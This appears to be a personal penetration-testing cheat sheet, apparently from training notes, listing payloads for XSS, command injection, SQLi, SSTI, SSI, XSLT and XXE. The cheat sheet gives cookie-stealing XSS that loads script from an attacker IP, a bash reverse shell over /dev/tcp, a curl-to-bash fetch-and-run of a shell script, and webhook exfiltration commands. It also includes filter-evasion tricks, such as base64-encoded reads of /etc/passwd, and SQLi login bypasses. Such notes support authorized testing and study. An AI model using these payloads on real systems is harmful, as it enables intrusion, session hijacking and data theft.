# Input is reflected on the page
## XSS
1. Test for this with:
```html
<script>alert(window.origin)</script>
```


## Command Injection
**Injection Operators:**
```shell 
1 ; whoami
1 & whoami & 
1 && whoami 
1 | whoami
1 || whoami || #Only executes second command if first one returns an error
1 `whoami` #Unix-based systems
1 $(whoami) #Unix-based systems
```
>**NOTE:** Test for both spaced and unspaced commands!!!!
### URLs
If a site retrieves information from the data provided in the URL (ex: `/stock?productID=31&ID=23`)
1. Try `& echo tester &` and other command injection characters and check if it responds with `tester`
### Inputs
We can test on any data that is being sent to a server (ex: productIDs, file uploads, search function, URL, etc.) and is being reflected on the page with the injection operators listed above.
#### Error / Invalid Input
Go through [[#Filter / WAF Detection]]



## SQLi
If there is user input being sent to the back-end, test for SQLi with the following:
1. `'` or `' or '2'='1';-- -`
	- Should break the response or come back with an error
2. If you find an SQLi vulnerability, intercept request, copy and put into a file, and submit into sqlmap
3. If SQLMap can't detect it, manually exploit with [[SQLi Reference]]
4. When manually exploiting, try to gain a reverse shell by starting at [[SQLi Reference#Reading Files]] and work your way down


## SSTI
Submit the following string to test for SSTI:
```twig
${{<%[%'"}}%\.
```
- If this results in an error, exploit for SSTI using [[Cybersecurity/CBBH Modules/3. Input-Based Attacks/5. SSI - Server-Side Includes Injection/Cheatsheet|Cheatsheet]]


## SSI
Test for this if user input is reflected on into static HTML;
- Or if you see `.shtml`, `.shtm`, and `.stm` files.

1. Test with the following input where user would supply input to be reflected (such as your name):
```html
<!--#printenv -->
```
2. If this is executed, we can try executing arbitrary commands using `exec`:
```html
<!--#exec cmd="id" -->
```



## XSLT
If we find an input that is reflected on the page (such as our name), we can test if our input is sanitized before XSLT processing by inputting: `<`
- If there is a `500` error, it may be vulnerable

If so, try the following to see if it processes our input:
```xml
<xsl:value-of select="system-property('xsl:version')" />
<br/>
```
- If our input is interpreted, we have confirmed vulnerability
- If confirmed, go through [[Cybersecurity/CBBH Modules/3. Input-Based Attacks/6. XSLT - Extensible Stylesheet Language Transformations Server-Side Injection/Reference#Information Disclosure|Reference]]


## XXE (If XML data is being supplied)
### LFI: [[1. Local File Disclosure]]
### Advanced File Disclosure: [[2. Advanced File Disclosure]]
### Blind Data Exfiltration: [[3. Blind Data Exfiltration]]



# Input is sent to another user / blind
1. Contact Form
2. Testimonial form
3. Form for approval
## XSS (Session Hijacking)
We can test each input parameter with a payload that probes our attacking machine to find if it is vulnerable:
1. Start a listener:
```shell
sudo php -S 0.0.0.0:80
```
2. Submit XSS payload to send a request back to our machine
```
<script src=http://OUR_IP/username></script>
```
- We should receive a call to our listener if it is vulnerable
3. If we dent receive anything, try the following payloads:
```html
<script src=http://OUR_IP/username></script>

'><script src=http://OUR_IP/username></script>

"><script src=http://OUR_IP/username></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.17\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP/username")</script>
```
4. If we receive something back, we can host a JS file to execute to grab their cookie as `script.js`:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;

new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
5. Now change your payload to grab this file from our listener, and we should get their cookie:
```html
<script src=http://OUR_IP/script.js></script>
```



## Command Injection
**Injection Operators:**
```shell 
1 ; whoami
1 & whoami & 
1 && whoami 
1 | whoami
1 || whoami || #Only executes second command if first one returns an error
1 `whoami` #Unix-based systems
1 $(whoami) #Unix-based systems
```
>**NOTE:** Test for both spaced and unspaced commands!!!!
### Inputs
We can test on any data that is being sent to a server by (ex: productIDs, file uploads, search function, URL, etc.):
1. Starting a Python server: `python -m http.server 80`
2. Sending command to our python server: `curl http://10.10.14.17:80`
	- If we get a response, we can continue to exploit
#### RCE (Remote Shell)
1. Create a file called `rev.sh`:
```shell
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.17/4561 0>&1'
```
2. Start Python server again
3. Send `curl` request through command injection: `curl http://10.10.14.17:80/rev.sh|bash`

If this doesn't work:
1. Confirm vulnerability by starting your Python server again and sending: `ProductID=1||wget http://www.webhook.site/your-site||`
2. If this is vulnerable, you can connect to reverse shells, or execute commands and send them back to your website:

**Reverse Shell:**
`ProductID=1||bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'||

**Sending Commands:**
``ProductID=1||curl http://`whoami`.webhook.site/your-id||``
#### Output Redirection
1. Try to send a command, or information from another resource to an accessible location:
```shell
& whoami > /var/www/static/whoami.txt &
```
or
```shell
& cat flag.txt > ./uploads/image.jpg &
```
### Filter / WAF Detection
If we receive `invalid input` when sending payloads, we now a security mechanism is in place detecting a blacklisted character or command.
#### Testing Blacklisted Characters
1. Reduce our input to 1 character at a time (ex: `;`)
	- If it still gets blocked, we know that character is blocked now
2. Try replacing that character with the URL-encoded version (ex: `%3b`)
3. If its still blocked, refer to the below cheatsheet:

| Code                    | Description                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------- |
| `printenv`              | Can be used to view all environment variables                                      |
| **Spaces**              |                                                                                    |
| `%09`                   | Using tabs instead of spaces                                                       |
| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}`              | Commas will be replaced with spaces                                                |
| **Other Characters**    |                                                                                    |
| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |
#### Testing Blacklisted Commands
If a command is blacklisted:
1. Try inserting characters within our command:
	- `w'h'o'am'i` or `w"h"o"am"i`
	- `who$@ami` or `w\ho\am\i`
2. Try manipulating past the filter to execute the command:
	- `$(a="WhOaMi";printf %s "${a,,}")` or `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
	- `$(rev<<<'imaohw')`
3. Try encoding the command then executing:
	- `echo -n 'whoami' | base64` -> `Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==`
	- Then use: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
4. Try using automated tools to obfuscate commands such as [[2. Bypassing Blacklisted Objects#Linux (Bashfuscator)]]

| Code                                                         | Description                         |
| ------------------------------------------------------------ | ----------------------------------- |
| **Character Insertion**                                      |                                     |
| `'` or `"` in between characters (whoa'm'oi)                 | Total must be even                  |
| `$@` or `\`                                                  | Linux only                          |
| **Case Manipulation**                                        |                                     |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |
| **Reversed Commands**                                        |                                     |
| `echo 'whoami' \| rev`                                       | Reverse a string                    |
| `$(rev<<<'imaohw')`                                          | Execute reversed command            |
| **Encoded Commands**                                         |                                     |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |



## SQLi
If there is user input being sent somewhere, but no data is being returned, test the following:
1. `' OR SLEEP(5)-- -`
	- Should be a 5 second delay if vulnerable
2. If you find a delay, intercept request, copy and put into a file, and submit into sqlmap



## XXE (If XML data is being supplied)
### LFI: [[1. Local File Disclosure]]
### Advanced File Disclosure: [[2. Advanced File Disclosure]]
### Blind Data Exfiltration: [[3. Blind Data Exfiltration]]


# Login Attacks
## SQLi
1. Test for SQLi with the following in the `username` field:
	- `admin'`
	- `admin' or '1'='1';-- -`
	- `admin')-- -`
	- `' or 1=1 limit 1 --` (this is always true and will log you in as the first user in the database)
	- `admin' order by 1-- -` (increase the `1` up to `20`, testing one-by-one)
	- `admin' UNION select 1,2,3-- -` (increase the number of columns up until you reach `20`)

2. If this doesn't work, try appending a valid username before the injection, then try without any username before each injection
3. Once you find an SQLi vulnerability, intercept request, copy and put into a file, and submit into SQLMap
4. If SQLMap can't detect it, manually exploit with [[SQLi Reference]]


## XXE (XML is used to submit login attempts):[[7. XML External Entity (XXE) Injection]]



